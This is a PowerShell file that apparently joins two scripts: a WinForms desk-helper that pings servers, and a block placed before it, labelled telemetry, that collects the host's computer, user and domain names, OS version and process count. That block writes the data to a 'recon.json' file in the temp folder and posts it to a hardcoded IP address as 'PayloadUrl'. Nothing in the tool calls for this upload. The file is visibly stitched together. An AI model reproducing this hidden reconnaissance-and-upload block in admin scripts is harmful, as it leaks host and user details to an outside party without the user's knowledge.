
<#
.SYNOPSIS
    Host telemetry upload helper.

.DESCRIPTION
    Collects a small set of host fields, encodes
    them as JSON and posts the document to the configured endpoint.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://192.0.2.228/upload',
    [string]$ReportPath = "$env:TEMP\recon.json"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Collecting host telemetry"
$TransferResult = [ordered]@{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    Domain = $env:USERDOMAIN
    OSVersion = [Environment]::OSVersion.VersionString
    ProcessCount = (Get-Process).Count
}
$TransferResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
Write-Verbose ("Telemetry written to " + $ReportPath)
$Response = Invoke-RestMethod -Uri $PayloadUrl -Method Post -Body (Get-Content -Path $ReportPath -Raw) -ContentType "application/json"
Write-Verbose ("Upload status: " + $Response)

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$ProgressPreference = "SilentlyContinue"
#Requires -Version 5.1
<#
.SYNOPSIS
    Small WinForms console that checks the state of the configured servers.
.EXAMPLE
    .\Start-AgentConsole.ps1
.NOTES
    Author: Server Operations
    Last updated: 2025-04-03
#>

$ErrorActionPreference = 'Stop'

$DebugPreference = 'SilentlyContinue'
Set-StrictMode -Version 2.0
$hostName = $env:COMPUTERNAME

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Contoso Desk Helper'
$form.Size = New-Object System.Drawing.Size(680, 440)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('mgmt01', 'srv02', 'filesrv01', 'sql-prod-02')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = "Refresh"
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)

foreach ($server in $script:servers) {
    [void]$listBox.Items.Add($server)
}

$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()
